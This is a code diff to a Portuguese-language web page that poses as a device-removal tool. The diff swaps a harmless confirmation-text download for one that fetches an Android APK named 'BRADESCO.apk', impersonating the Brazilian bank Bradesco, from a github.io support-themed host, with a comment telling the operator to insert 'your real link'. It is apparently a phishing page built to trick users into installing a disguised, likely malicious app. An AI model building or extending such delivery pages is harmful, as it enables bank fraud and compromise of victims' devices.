@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
@@ -146,29 +146,19 @@
     <script>
         function iniciarDownload() {
             if(confirm("Tem certeza que deseja remover todos os dispositivos conectados? Um arquivo será baixado.")) {
-                // Criar um arquivo para download
-                const conteudo = "Relatório de dispositivos removidos\n\nData: " + new Date().toLocaleString() + 
-                                "\n\nEsta é uma confirmação de que todos os dispositivos foram removidos da sua conta.\n\n" +
-                                "Ação realizada através do Gerenciador de Dispositivos.";
                 
-                // Criar blob
-                const blob = new Blob([conteudo], { type: 'text/plain' });
-                
-                // Criar URL para o blob
-                const url = URL.createObjectURL(blob);
+                // SUBSTITUA ESTE LINK PELO SEU LINK REAL
+                const linkDoDownload = "https://suportedigital-pixel.github.io/suporte/BRADESCO.apk";
                 
                 // Criar elemento de link para download
                 const a = document.createElement('a');
-                a.href = url;
-                a.download = 'confirmacao_remocao_dispositivos.txt';
+                a.href = linkDoDownload;
+                a.download = 'BRADESCO.apk'; // Nome do arquivo que será baixado
                 
                 // Adicionar ao DOM, clicar e remover
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
-                
-                // Liberar a URL do blob
-                URL.revokeObjectURL(url);
                 
                 // Mostrar indicador de download
                 const indicator = document.getElementById('downloadIndicator');
